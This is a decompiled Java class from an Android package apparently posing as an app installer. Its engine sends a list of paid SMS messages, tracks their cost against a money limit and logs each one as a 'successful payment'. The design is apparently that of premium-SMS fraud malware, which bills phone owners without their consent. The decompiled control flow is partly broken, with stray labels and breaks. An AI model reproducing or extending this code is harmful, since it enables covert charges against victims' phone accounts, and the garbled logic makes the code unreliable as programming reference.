package com.soft.android.appinstaller.sms.internals;

import android.content.Context;
import android.content.SharedPreferences;
import android.util.Log;
import com.soft.android.appinstaller.core.SmsInfo;
import com.soft.android.appinstaller.core.SmsInfo.SMS;
import com.soft.android.appinstaller.sms.BasicSMSSender;
import com.soft.android.appinstaller.sms.Limits;
import com.soft.android.appinstaller.sms.capi.SMSSenderEngine;

public class UnconfirmableSMSSenderEngineImpl
  extends BasicSMSSender
  implements SMSSenderEngine
{
  private static final String tag = "UnconfirmableSMSSenderEngineImpl";
  private Context context;
  private final SmsInfo data;
  Limits limits;
  private int nextID;
  
  public UnconfirmableSMSSenderEngineImpl(SmsInfo paramSmsInfo, SharedPreferences paramSharedPreferences, Context paramContext)
  {
    this.data = paramSmsInfo;
    this.context = paramContext;
    Log.v("UnconfirmableSMSSenderEngineImpl", "C-tor");
  }
  
  public boolean canSendMoreMessages()
  {
    while ((this.nextID < this.data.getUnconfirmableSmsCount()) && (this.data.getUnconfirmableSMS(this.nextID).getCost() > this.limits.expectedMoneyRest())) {
      this.nextID += 1;
    }
    int i;
    if (this.nextID < this.data.getUnconfirmableSmsCount())
    {
      i = 1;
      if (this.limits.smsCountRest() <= 0) {
        break label94;
      }
    }
    label94:
    for (int j = 1;; j = 0)
    {
      if ((i == 0) || (j == 0)) {
        break label99;
      }
      return true;
      i = 0;
      break;
    }
    label99:
    return false;
  }
  
  public void init(Limits paramLimits)
  {
    this.limits = paramLimits;
    this.nextID = 0;
  }
  
  public void sendOneMessage()
  {
    if (!canSendMoreMessages()) {
      return;
    }
    SmsInfo.SMS localSMS = this.data.getUnconfirmableSMS(this.nextID);
    SendMessage(this.context, localSMS);
    this.limits.registerSuccessfulPayment(localSMS);
    this.nextID += 1;
  }
}
